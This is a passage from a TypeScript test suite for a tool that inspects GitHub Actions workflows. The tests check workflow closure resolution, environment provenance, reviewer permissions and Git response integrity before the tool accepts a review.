  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
    programs: [{ id: 'action', path: 'action/action.yml', kind: 'composite-action', content: action },
      { id: 'inline', path: 'action/action.yml', kind: 'shell-program', content: action },
      { id: 'first', path: 'action/first.js', kind: 'node-entrypoint', content: 'console.log("first");' },
      { id: 'second', path: 'action/second.js', kind: 'node-entrypoint', content: 'console.log("second");' }],
    edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }, { from: 'action', to: 'inline', role: 'run:composite:1' },
      { from: 'inline', to: 'first', role: order === 'ordered' ? 'program:1' : 'program:2' },
      { from: 'inline', to: 'second', role: order === 'ordered' ? 'program:2' : 'program:1' }] });
  if (order === 'ordered') await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview');
  else await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
});
it('does not accept an unresolved matrix, a dynamic shell command or ambiguous action manifests as complete closure', async () => {
  for (const body of ['on: push\njobs:\n  inspect:\n    strategy:\n      matrix:\n        os: [linux, windows]\n    steps: []\n',
    'on: push\njobs:\n  inspect:\n    steps:\n      - run: "$COMMAND"\n',
    'on: push\njobs:\n  inspect:\n    steps:\n      - run: "printf ok > script.js"\n']) {
    await expect(fixture({ workflow: body }).inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  }
  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
    programs: [{ id: 'action', path: 'action/action.yml', kind: 'composite-action', content: 'runs: {using: composite, steps: []}\n' },
      { id: 'alternate', path: 'action/action.yaml', kind: 'data-file', content: 'runs: {using: composite, steps: []}\n' }],
    edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }] });
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
});
it('binds separate workflow, job and step environment provenance without merging their precedence origins', async () => {
  const f = fixture({ workflow: 'on: push\nenv:\n  LEVEL: root\njobs:\n  inspect:\n    env:\n      LEVEL: job\n    steps:\n      - run: printf "$LEVEL"\n        env:\n          LEVEL: step\n' });
  const source = f.document.units.find(u => u.id === 'workflow-ci')!;
  for (const [job, step, definition, origin] of [['', 0, 'root', 'workflow-env'], ['inspect', 0, 'job', 'job-env'],
    ['inspect', 1, 'step', 'step-env']] as const) {
    const anchor = { workflow: workflowPath, job, step, input: 'env:LEVEL', origin };
    f.document.inputs.push({ id: publisherInventorySha256(anchor), ...anchor,
      sourceFingerprint: publisherInventorySha256({ kind: 'publisher-inventory-input-source',
        source: { repositoryId: source.repositoryId, commit: source.commit, path: source.path, contentSha256: source.contentSha256 },
        definition, effectiveEnvironment: { LEVEL: definition }, callerInputs: {}, variables: {} }) });
  }
  f.seal(); await expect(f.inspect()).resolves.toMatchObject({ approvals: [{ actorId: 17 }] });
  f.document.inputs[0].sourceFingerprint = '0'.repeat(64); f.seal();
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'binding-mismatch' });
});
it('unobserved output selectors, secret-derived behavior and cross-platform environment aliases stay unresolved', async () => {
  for (const body of ['on: push\nenv:\n  SELECTOR: ${{ needs.build.outputs.selector }}\njobs:\n  inspect:\n    steps: []\n',
    'on: push\nenv:\n  SELECTOR: ${{ secrets.SELECTOR }}\njobs:\n  inspect:\n    steps: []\n',
    'on: push\nenv:\n  LEVEL: root\njobs:\n  inspect:\n    env:\n      level: overridden\n    steps: []\n']) {
    const f = fixture({ workflow: body });
    await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
    expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
  }
});
it('does not accept executable evidence-PR changes alongside the fixed review document', async () => {
  const f = fixture(), tree = setupInstallationTreeFixture(new Map([['README.md', 'changed executable context\n'],
    [SETUP_PUBLISHER_INVENTORY_PATH, canonicalPublisherInventoryJson(f.document)]]));
  // The reader sees a complete different tree, not a mocked "scope valid" flag.
  f.commits.set(head, tree.root); for (const [sha, value] of tree.trees) f.trees.set(sha, { ...value, tree: value.tree.map(entry => ({ ...entry,
    ...(entry.type === 'blob' ? { size: entry.path === 'README.md' ? 27 : Buffer.byteLength(canonicalPublisherInventoryJson(f.document)) } : {}) })) });
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'review-unavailable' });
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
});
it('rejects denied, stale and identity-mismatched reviewer permissions using fresh authenticated reads', async () => {
  for (const permission of [{ permission: 'read', user: { id: 17, login: 'reviewer' } },
    { permission: 'write', user: { id: 99, login: 'reviewer' } }, { permission: 'write', user: { id: 17, login: 'another-user' } }]) {
    const f = fixture(); f.setPermission(permission);
    await expect(f.inspect()).rejects.toThrow();
  }
  const f = fixture(); await f.inspect(); f.setPermission({ permission: 'none', user: { id: 17, login: 'reviewer' } });
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'review-required' });
  expect(f.request.mock.calls.filter(([r]) => r.endsWith('/permission'))).toHaveLength(2);
});
it('checks review pagination and immutable Git response integrity instead of returning partial authority', async () => {
  const f = fixture(), root = f.document.destination.tree, before = f.trees.get(root) as Record<string, unknown>;
  f.trees.set(root, { ...before, truncated: true });
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
});
